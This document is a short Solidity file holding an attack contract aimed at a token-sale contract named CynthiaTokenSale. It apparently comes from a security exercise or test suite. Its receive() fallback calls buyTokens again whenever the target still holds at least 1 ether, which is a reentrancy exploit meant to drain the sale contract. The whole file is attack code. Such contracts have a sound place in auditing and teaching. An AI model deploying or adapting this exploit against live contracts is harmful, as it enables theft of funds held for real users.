// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./CynthiaTokenSale.sol";

contract AttackContract {
    CynthiaTokenSale public tokenSale;

    constructor(address _tokenSale) {
        tokenSale = CynthiaTokenSale(_tokenSale);
    }

    function attack() external payable {
        tokenSale.buyTokens{value: 1 ether}();
    }

    receive() external payable {
        if (address(tokenSale).balance >= 1 ether) {
            tokenSale.buyTokens{value: 1 ether}();
        }
    }
}
